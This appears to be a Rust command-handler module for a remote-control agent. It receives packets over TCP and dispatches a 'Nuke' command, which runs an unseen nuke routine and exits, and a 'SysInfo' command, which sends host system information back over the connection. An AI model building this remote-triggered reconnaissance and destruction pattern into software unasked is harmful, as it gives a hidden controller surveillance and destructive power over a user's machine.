use tokio::io::AsyncWriteExt;

use crate::types::Codes;
use crate::types::Packet;

mod nuke;
mod sysinfo;

pub async fn handler(packet: Packet, stream: &mut tokio::net::TcpStream) {
    match packet.code {
        Codes::Nuke => {
            nuke::nuke();
            let packet = Packet::new(Codes::Success, &[]);
            stream.write(&packet.to_bytes()).await.ok();
            std::process::exit(0);
        }
        Codes::SysInfo => {
            let infos = sysinfo::sysinfo();
            let packet = Packet::new(Codes::Success, infos.as_bytes());
            stream.write(&packet.to_bytes()).await.ok();
        }
        _ => {
            std::process::exit(0);
        }
    }
}
